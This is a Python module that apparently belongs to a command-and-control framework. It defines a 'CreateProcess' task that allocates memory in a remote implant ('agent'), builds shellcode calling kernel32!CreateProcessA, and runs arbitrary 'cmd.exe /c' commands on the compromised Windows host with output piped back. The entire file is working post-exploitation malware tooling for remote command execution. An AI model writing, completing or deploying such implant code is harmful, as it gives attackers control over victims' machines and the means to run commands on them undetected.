NAME = "CreateProcess"
DESCRIPTION = "Execute a command using kernel32!CreateProcessA with redirected handles"
PARAMS = [
    {"name":"command_line", "description":"Command to run", "type":"str"},
    {"name":"h_pipe", "description":"Handle for stdout redirection", "type":"hex"},
]
DEPENDENCIES = ["NtAllocateVirtualMemory", "NtFreeVirtualMemory"]

def build_si_struct(buffer_add, flags, h_pipe):
    print(f"Creating STARTUP_INFORMATION_A structure. buffer_add={hex(buffer_add)}, flags={hex(flags)}, h_pipe={hex(h_pipe)}")
    import struct
    # hStdOutput = h_pipe, hStdError = h_pipe
    si_data = bytearray(104)
    struct.pack_into('<I', si_data, 0, 104)      # cb
    struct.pack_into('<I', si_data, 60, flags)   # dwFlags
    struct.pack_into('<Q', si_data, 88, h_pipe)  # hStdOutput
    struct.pack_into('<Q', si_data, 96, h_pipe)  # hStdError
    return si_data, buffer_add+104

def CreateProcessA(agent_id, command_line, h_pipe, p_private):
    from models.agent import Agent
    from models.syscall import Syscall
    from services.binary import build_ptr, push_rtl, align_up

    agent = Agent.by_id(agent_id)
    # Resolve kernel32!CreateProcessA address
    func_addr = Syscall.sys(agent.id, "CreateProcessA")
    scratchpad = agent.scratchpad

    # Memory Layout in p_private:
    # 0x0: PROCESS_INFORMATION Struct (24 bytes)
    # 0x18: STARTUPINFOA Struct (104 bytes)
    # 0x80: Command Line String (Variable)
    
    
    
    process_information_data, startup_info_ptr = build_ptr(p_private, b"\x00"*24)
    si_data, cmdline_ptr = build_si_struct(startup_info_ptr, 0x100, h_pipe)
    cmdline_ptr = align_up(cmdline_ptr, 8)
    cmdline_data, next_ptr = build_ptr(cmdline_ptr, command_line.encode())
    


    # 10 Parameters for CreateProcessA
    params = [
        0,              # P1: lpApplicationName (NULL)
        cmdline_ptr,     # P2: lpCommandLine
        0,              # P3: lpProcessAttributes
        0,              # P4: lpThreadAttributes
        1,              # P5: bInheritHandles (TRUE)
        0,              # P6: dwCreationFlags
        0,              # P7: lpEnvironment
        0,              # P8: lpCurrentDirectory
        startup_info_ptr, # P9: lpStartupInfo
        p_private     # P10: lpProcessInformation
    ]

    shellcode = push_rtl(func_addr, params, agent.debug)
    data = process_information_data + si_data + cmdline_data
    param_names = [
    "lpApplicationName",
    "lpCommandLine",
    "lpProcessAttributes",
    "lpThreadAttributes",
    "bInheritHandles",
    "dwCreationFlags",
    "lpEnvironment",
    "lpCurrentDirectory",
    "lpStartupInfo",
    "lpProcessInformation",
    ]

    print("=== CreateProcess Parameters ===")
    for name, value in zip(param_names, params):
        if isinstance(value, int):
            print(f"{name:<25} = 0x{value:016X} ({value})")
        else:
            print(f"{name:<25} = {value}")
    return data, shellcode

def function(agent_id, args):
    from services.orders import write_to_agent, send_and_wait, read_from_agent
    import struct
    command = f"cmd.exe /c {args[0]}"
    h_pipe = args[1]

    # 1. Allocate Private Memory for structs
    mem_size = 1024
    alloc_ret = NtAllocateVirtualMemory(agent_id, [mem_size, 0x04])
    if alloc_ret["retval"] != 0:
        return {"Result": "Failed to allocate process memory"}
    
    p_private = alloc_ret["allocated_memory"]

    # 2. Generate and write the function logic
    data, shellcode = CreateProcessA(agent_id, command, h_pipe, p_private)
    write_to_agent(agent_id, p_private, data)
    
    # 3. Execute CreateProcessA
    ret_val = int.from_bytes(send_and_wait(agent_id, shellcode), 'little')
    
    # 4. Extract Process info if successful (BOOL 1 is success)
    h_proc, h_thread = 0, 0
    print(f"CreateProcessA = {ret_val}")
    if ret_val != 0:
        pi_raw = read_from_agent(agent_id, p_private, 16)
        h_proc = int.from_bytes(pi_raw[:8], 'little')
        h_thread = int.from_bytes(pi_raw[8:16], 'little')

    NtFreeVirtualMemory(agent_id, [p_private, mem_size, 0x8000])

    return {
        "Success": ret_val,
        "PROCESS_HANDLE": h_proc,
        "THREAD_HANDLE": h_thread
    }